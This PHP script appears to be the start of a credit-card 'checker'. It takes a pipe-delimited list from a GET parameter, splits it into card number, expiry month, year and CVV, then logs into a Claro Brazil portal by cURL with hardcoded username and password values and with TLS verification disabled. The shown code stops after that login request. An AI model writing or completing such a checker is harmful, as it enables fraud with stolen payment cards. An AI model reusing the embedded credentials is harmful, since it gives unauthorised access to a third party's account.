<?php
error_reporting(0);

if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

function trazer($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];
$total = strlen($ano);
if ($total > 2){
  $ano = substr($ano, 2,4);
}
##### FIM DA PARTE BÁSICA ######


#########################
##### FAZER O LOGIN #####
#########################


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cap.claro.com.br/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
#curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
#curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: cap.claro.com.br',

  ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'username=F124110&password=Br%40sil42');
echo  $p1 = curl_exec($ch);

?>